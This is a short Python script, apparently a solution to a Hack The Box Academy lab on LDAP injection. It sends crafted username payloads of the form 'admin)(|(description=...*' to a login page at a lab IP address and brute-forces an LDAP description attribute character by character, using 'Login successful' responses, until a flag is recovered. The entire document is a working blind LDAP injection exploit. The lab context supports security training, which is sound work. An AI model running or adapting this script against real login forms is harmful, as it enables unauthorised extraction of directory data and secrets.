# LDAP - Data Exfiltration & Blind Exploitation
# https://academy.hackthebox.com/module/204/section/2230

import requests

base_url = 'http://94.237.55.96:46252/index.php'
wordlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
found_chars = ""
target_string = '}'

while True:
    for word in wordlist:
        payload = {"username":f"admin)(|(description={found_chars}{word}*", "password":"test)"}
        r = requests.post(base_url, data=payload)

        if "Login successful" in r.text:
            found_chars += word
            print(f"Correct character found: {found_chars}")

    if found_chars.endswith(target_string):
        print("\nTARGET STRING FOUND:", found_chars)
        break
        